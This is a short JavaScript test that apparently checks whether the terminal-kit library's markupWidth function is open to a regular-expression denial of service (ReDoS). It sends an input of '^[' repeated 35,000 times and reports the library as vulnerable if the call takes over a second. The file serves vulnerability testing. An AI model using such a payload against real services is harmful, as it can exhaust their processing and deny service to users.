// test("ReDos in terminal-kit", () => {
  const termkit = require("terminal-kit");
  const measureTime = require("../utils").measureTime;

  let payload = "^[".repeat(35000);

  let t = measureTime(function () {
    termkit.markupWidth(payload);
  });

  let time = t[0] + t[1] / 1000000000;

if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
